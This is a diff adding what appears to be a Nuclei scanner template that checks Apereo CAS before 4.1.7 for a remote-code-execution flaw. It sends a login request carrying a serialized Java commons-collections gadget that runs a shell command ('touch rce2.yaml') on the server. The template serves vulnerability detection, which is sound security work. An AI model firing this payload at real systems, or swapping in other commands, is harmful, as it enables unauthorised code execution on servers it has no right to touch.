@@ -1,0 +1,39 @@
+id: apereo-cas-rce
+
+info:
+  name: Apereo CAS RCE
+  author: ImNightmaree
+  severity: critical
+  description: A remote code execution vulnerability was found in Apereo CAS (before 4.1.7) where the execution parameter's serialized input is handled in an unsafe fashion.
+  tags: apereo,cas,rce,oast
+
+requests:
+  - raw:
+    - |
+       GET /cas/login HTTP/1.1
+       Host: {{Hostname}}
+  
+    - |
+       POST /cas/login HTTP/1.1
+       Host: {{Hostname}}
+       Content-Type: application/x-www-form-urlencoded
+        
+       username=foo&password=bar&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&execution=9eb9c131-340e-4eec-8d70-c58b645f4ed1_{{generate_java_gadget("commons-collections4.0","touch rce2.yaml", "base64")}}&_eventId=submit&submit=LOGIN
+  
+  
+    cookie-reuse: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
